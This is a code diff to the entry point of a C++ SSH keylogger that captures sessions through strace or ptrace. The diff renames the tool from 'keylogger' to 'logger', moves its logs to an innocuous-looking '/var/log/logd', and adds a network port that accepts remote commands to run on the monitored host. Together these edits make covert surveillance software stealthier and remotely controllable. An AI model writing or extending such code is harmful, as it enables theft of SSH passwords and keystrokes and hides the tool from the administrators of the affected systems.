@@ -2,6 +2,7 @@
 #include <sys/stat.h>
 
 #include "process_logger.hpp"
+#include "network/server.hpp"
 
 namespace po = boost::program_options;
 namespace fs = boost::filesystem;
@@ -68,8 +69,9 @@ int main(int argc, char **argv) {
     desc.add_options()
             ("help", "produce help message")
             ("daemon,d", "daemonize mode")
-            ("mode,m", po::value<std::string>()->default_value("ptrace"), "[strace/ptrace] run ssh keylogger via STRACE or PTRACE mechanism (ptrace by default)")
-            ("output,o", po::value<std::string>()->default_value("/var/log/SSH_CE_Monitor"), "path to directory(if it doesn't exist, it will be created) for saving logfiles");
+            ("mode,m", po::value<std::string>()->default_value("ptrace"), "[strace/ptrace] run ssh logger via STRACE or PTRACE mechanism (ptrace by default)")
+            ("output,o", po::value<std::string>()->default_value("/var/log/logd"), "path to directory(if it doesn't exist, it will be created) for saving logfiles")
+            ("port,p", po::value<uint16_t>(),"port for getting commands to execute predefined pool of commands on ssh logger side");
 
     po::variables_map vm;
     po::store(po::parse_command_line(argc, argv, desc), vm);
@@ -79,6 +81,17 @@ int main(int argc, char **argv) {
         std::cout << desc << std::endl;
         return 1;
     }
+
+    boost::asio::io_service ios;
+    std::unique_ptr<Server> server_ptr;
+    if (vm.count("port")) {
+        uint16_t port = vm["port"].as<uint16_t>();
+        server_ptr = std::make_unique<Server>(ios, port);
+    }
+    std::thread thread_t{[&ios]() {
+        ios.run();
+    }};
+    thread_t.detach();
 
     if (vm.count("daemon")) {
         becomeDaemon(vm, sleep_time);
